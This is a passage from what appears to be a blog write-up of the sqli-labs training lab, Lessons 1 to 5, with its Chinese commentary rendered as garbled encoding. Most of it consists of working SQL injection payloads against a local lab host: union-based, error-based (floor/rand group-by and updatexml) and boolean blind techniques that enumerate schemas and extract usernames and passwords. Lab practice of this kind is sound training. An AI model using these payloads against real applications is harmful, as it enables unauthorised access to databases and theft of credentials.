<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),3 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225821260.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230132459.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230220235.png" class>

<p><code>å¯¹emailsè¡¨çˆ†å­—æ®µï¼Œä¸‹é¢ä¸ºç¬¬ä¸€ä¸ªå­—æ®µ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232717251.png" class>

<p><code>ç¬¬äºŒä¸ªå­—æ®µä¸ç¬¬ä¸‰ä¸ªå­—æ®µå¦‚ä¸‹ï¼Œç¬¬ä¸‰ä¸ªå­—æ®µä¸ºç©º</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 2,1),3 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232456670.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232741394.png" class>

<p><code>çŸ¥é“äº†å­—æ®µåä¸è¡¨åå°±å¯ä»¥è¯»å–æ•°æ®äº†ï¼Œè¯»å–åˆ°äº†æœ¬ä¸è¯¥è®©ç”¨æˆ·è¯»å–åˆ°çš„å†…å®¹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230233414685.png" class>

<h2 id="0x02-Less-2-GET-åŸºäºæŠ¥é”™-åŸºäºæ•´å‹"><a href="#0x02-Less-2-GET-åŸºäºæŠ¥é”™-åŸºäºæ•´å‹" class="headerlink" title="0x02.Less-2 GET åŸºäºæŠ¥é”™ åŸºäºæ•´å‹"></a>0x02.Less-2 GET åŸºäºæŠ¥é”™ åŸºäºæ•´å‹</h2><p><code>åŒLess1ï¼Œåªéœ€å°†å•å¼•å·å»æ‰å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-2/?id=0 union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure>

<h2 id="0x03-Less-3-GET-åŸºäºæŠ¥é”™-å•å¼•å·-æ‹¬å·"><a href="#0x03-Less-3-GET-åŸºäºæŠ¥é”™-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x03.Less-3 GET åŸºäºæŠ¥é”™ å•å¼•å·+æ‹¬å·"></a>0x03.Less-3 GET åŸºäºæŠ¥é”™ å•å¼•å·+æ‹¬å·</h2><p><code>åŒLess1ï¼ŒåŠ ä¸€ä¸ªæ‹¬å·ï¼Œè¿™æ˜¯ä¸€ä¸ªå˜å½¢é¢˜</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-3/?id=0&#x27;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure>

<h2 id="0x04-Less-4-GET-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·"><a href="#0x04-Less-4-GET-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x04.Less-4 GET åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·"></a>0x04.Less-4 GET åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·</h2><p><code>åŒLess3ï¼Œåªéœ€å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-4/?id=0&quot;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Less-5-GET-åŒæ³¨å…¥-å•å¼•å·"><a href="#0x05-Less-5-GET-åŒæ³¨å…¥-å•å¼•å·" class="headerlink" title="0x05.Less-5 GET åŒæ³¨å…¥ å•å¼•å·"></a>0x05.Less-5 GET åŒæ³¨å…¥ å•å¼•å·</h2><p><code>æµ‹è¯•å‘ç°æ­£å¸¸?id=1æœ‰å›æ˜¾ï¼ŒåŠ ä¸Šå•å¼•å·ä¼šå‡ºç°æŠ¥é”™</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174115897.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174144932.png" class>

<p><code>æ¥ç€æµ‹è¯•å‘ç°å½“æ¡ä»¶ä¸ºå‡æ—¶æ²¡æœ‰å›æ˜¾ï¼Œå­˜åœ¨boolæ³¨å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174447919.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174515636.png" class>

<p><code>æ¥ç€æµ‹è¯•å‘ç°å­˜åœ¨æ—¶é—´å»¶æ—¶</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and sleep(5) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231175223651.png" class>

<h3 id="1-ç¬¬ä¸€ç§æ–¹æ³•-åˆ©ç”¨æŠ¥é”™æ³¨å…¥"><a href="#1-ç¬¬ä¸€ç§æ–¹æ³•-åˆ©ç”¨æŠ¥é”™æ³¨å…¥" class="headerlink" title="1.ç¬¬ä¸€ç§æ–¹æ³•(åˆ©ç”¨æŠ¥é”™æ³¨å…¥)"></a>1.ç¬¬ä¸€ç§æ–¹æ³•(åˆ©ç”¨æŠ¥é”™æ³¨å…¥)</h3><p><strong>å…ˆæ¥ç†è§£å‡ ä¸ªå‡½æ•°</strong></p>
<p><code>concatèšåˆå‡½æ•°</code></p>
<blockquote>
<p>ç®€å•çš„è¯´ï¼Œä½¿ç”¨èšåˆå‡½æ•°è¿›è¡ŒåŒæ³¨å…¥æŸ¥è¯¢æ—¶ï¼Œä¼šåœ¨é”™è¯¯ä¿¡æ¯ä¸­æ˜¾ç¤ºä¸€éƒ¨åˆ†é”™è¯¯ä¿¡æ¯ã€‚</p>
<p>æ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>å¦‚ä¸‹ä¾‹ï¼šæ•°æ®åº“ç‰ˆæœ¬ä¸º5.5.530</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231192403062.png" class>

<p><code>rand()å‡½æ•°</code></p>
<blockquote>
<p>rand() æ˜¯ä¸€ä¸ªéšæœºå‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°çš„ç§å­0ä¹‹åï¼Œå¯ä»¥å½¢æˆå›ºå®šçš„ä¼ªéšæœºåºåˆ—ï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ä¸€æ ·çš„ã€‚å¦‚ä¸‹å›¾</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231190859205.png" class>

<p><code>floor()å‡½æ•°</code></p>
<blockquote>
<p>floor() å‡½æ•°çš„ä½œç”¨å°±æ˜¯è¿”å›å°äºç­‰äºæ‹¬å·å†…è¯¥å€¼çš„æœ€å¤§æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯å–æ•´ã€‚floor(rand(0)*2)è¾“å‡ºå¦‚ä¸‹ã€‚</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231191348407.png" class>

<p><code>group by</code></p>
<blockquote>
<p>group by ä¸»è¦ç”¨æ¥å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„ï¼ˆç›¸åŒçš„åˆ†ä¸ºä¸€ç»„ï¼Œç›¸åŒåå­—ä¼šåˆå¹¶ï¼‰</p>
</blockquote>
<p><code>count(*)</code></p>
<blockquote>
<p>count(*)ç”¨äºç»Ÿè®¡æ•°æ®å‡ºç°çš„æ¬¡æ•°</p>
</blockquote>
<p><strong>æ¢æµ‹åˆ—æ•°ï¼Œç»“æœä¸º3åˆ—</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231200902624.png" class>

<p><strong>çˆ†åº“</strong></p>
<blockquote>
<p>æŠ¥é”™æ—¶æ‰ä¼šå›æ˜¾</p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIzNTQ5Ni5odG1s">é”®å€¼æŠ¥é”™åŸç†å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201157161.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231201226057.png" class>

<p><strong>çˆ†è¡¨</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line">å°†table_schema=database()æ¢ä¸ºtable_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231204516748.png" class>

<p><strong>çˆ†usersè¡¨åˆ—å</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205019454.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231205043144.png" class>

<p><strong>çˆ†å­—æ®µ</strong></p>
<blockquote>
<p>concat_wsç”¨äºæŒ‡å®šç¬¦å·æ‹¼æ¥ï¼Œæœ¬æ¬¡ä½¿ç”¨-æ‹¼æ¥</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 0,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 1,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; union select count(*),1, concat(&#x27;[&#x27;,(select concat_ws(&#x27;-&#x27;,username,password) from users limit 3,1),&#x27;]&#x27;,floor(rand()*2)) as demo from information_schema.tables group by demo-- -</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231210556609.png" class>

<p><code>å¦ä¸€ç§æŠ¥é”™æ–¹å¼</code></p>
<blockquote>
<p>ä½¿ç”¨updatexmlå‡½æ•°ï¼Œupdatexml(XML_document, XPath_string, new_value);</p>
</blockquote>
<table>
<thead>
<tr>
<th><strong>å‚æ•°</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>XML_document</td>
<td>Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</td>
</tr>
<tr>
<td>XPath_string</td>
<td>Xpathæ ¼å¼çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>new_value</td>
<td>Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</td>
</tr>
</tbody></table>
<p><strong>payloadå¦‚ä¸‹</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select ***()),0x7e),1</span><br></pre></td></tr></table></figure>

<p><strong>åŸç†</strong></p>
<blockquote>
<p><code>concat()</code>å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆ<strong>XPATH_string</strong>çš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯</p>
</blockquote>
<p><code>çˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102233937461.png" class>

<p><code>ç®€å•çš„æ–¹æ³•</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234125500.png" class>

<p><code>ç”¨æˆ·ç‰ˆæœ¬ç­‰</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234201499.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234230939.png" class>

<p><code>çˆ†è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234706750.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102234733739.png" class>

<p><code>çˆ†å­—æ®µ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 1,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=0&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database() limit 2,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235422105.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235434612.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- -</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.1.100&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;0&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235643837.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102235701283.png" class>

<h3 id="2-ç¬¬äºŒç§æ–¹æ³•-åˆ©ç”¨boolæ³¨å…¥"><a href="#2-ç¬¬äºŒç§æ–¹æ³•-åˆ©ç”¨boolæ³¨å…¥" class="headerlink" title="2.ç¬¬äºŒç§æ–¹æ³•(åˆ©ç”¨boolæ³¨å…¥)"></a>2.ç¬¬äºŒç§æ–¹æ³•(åˆ©ç”¨boolæ³¨å…¥)</h3><p><code>åœ¨å¸ƒå°”å‹æ³¨å…¥ä¸­ï¼Œæ­£ç¡®ä¼šå›æ˜¾ï¼Œé”™è¯¯æ²¡æœ‰å›æ˜¾ï¼Œä»¥æ­¤ä¸ºä¾æ®é€å­—çˆ†ç ´</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;s&#x27;-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101182907330.png" class>

<blockquote>
<p>æ­¤ç§æ³¨å…¥å¯ä»¥ä½¿ç”¨bpçš„intruderæ¨¡å—è¿›è¡Œçˆ†ç ´ï¼Œå¦‚ä¸‹å›¾ã€‚ç”±äºmysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å­—å…¸ä¸ºa-zã€0-9ï¼Œç‰¹æ®Šçš„åŠ ä¸Šç‰¹æ®Šå­—ç¬¦å³å¯ã€‚</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190352877.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190421957.png" class>

<p><code>ä¾æ¬¡ç±»æ¨ï¼Œè¿›è¡Œçˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183102013.png" class>

<p><code>æ¥ä¸‹æ¥è¿›è¡Œçˆ†ç¬¬ä¸€å¼ è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#x27;em&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),6)=&#x27;emails&#x27; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183326285.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183525900.png" class>

<p><code>çˆ†å‡ºç¬¬å››å¼ è¡¨ä¸ºusersï¼Œæ¥ä¸‹æ¥è¿›è¡Œçˆ†åˆ—å</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure>

<p><code>ç¬¬ä¸€ä¸ªåˆ—åä¸ºid</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222734437.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure>

<p><code>ç¬¬äºŒä¸ªä¸ç¬¬ä¸‰ä¸ªåˆ—åä¸ºusernameã€password</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222533544.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222604381.png" class>

<p><code>çˆ†æ•°æ®å³usernameä¸passwordå­—æ®µçš„å†…å®¹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select username from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185002099.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select password from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185116009.png" class>

<p><strong>ä¹Ÿå¯ä»¥ä½¿ç”¨substræˆªæ–­å‡½æ•°è¿›è¡Œçˆ†åº“ã€çˆ†è¡¨ã€çˆ†å­—æ®µ</strong></p>
<blockquote>
<p>substrå‡½æ•°ä¸limitä¸åŒï¼Œæˆªå–ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºä»1å¼€å§‹ï¼Œè€Œlimitä»0å¼€å§‹</p>
</blockquote>
<p><code>çˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),3,1)=&#x27;c&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),4,1)=&#x27;u&#x27; -- -</span><br><span class="line">// åŒæ ·å¯ä»¥ä½¿ç”¨intruderè¿›è¡Œçˆ†ç ´</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102204726445.png" class>

<p><code>ä¹Ÿå¯ä»¥ä½¿ç”¨ASCIIè¿›è¡ŒæŸ¥è¯¢</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and ord(substr(database(),1,1))=115 -- -</span><br><span class="line">// ordä¸ºASCIIè½¬æ¢å‡½æ•°ï¼Œsçš„ASCIIå€¼ä¸º115ã€‚</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205332810.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205349191.png" class>

<p><code>çˆ†è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#x27;u&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,2)=&#x27;us&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,3)=&#x27;use&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,4)=&#x27;user&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)=&#x27;users&#x27; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205811674.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102210130815.png" class>

<p><code>çˆ†å­—æ®µ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1,2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure>

